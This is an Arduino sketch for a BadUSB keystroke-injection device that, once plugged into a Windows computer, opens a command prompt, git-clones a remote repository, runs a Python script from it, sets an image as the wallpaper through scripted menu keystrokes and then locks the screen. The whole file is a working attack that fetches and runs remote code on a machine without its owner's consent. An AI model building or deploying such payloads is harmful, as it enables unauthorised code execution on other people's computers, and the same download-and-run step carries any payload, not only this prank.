#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(150);

  Keyboard.print("cmd.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("cd ..");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("cd Public");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("git clone https://github.com/PSZMAJ/BadUSB-ChangeWallpaper.git");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("cd BadUSB-ChangeWallpaper");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("python test.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.print("start fotka.png");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);

  for (int i = 0; i < 11; i++) {
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(500);
  }

  for (int i = 0; i < 8; i++) {
    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();
    delay(500);
  }

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
}
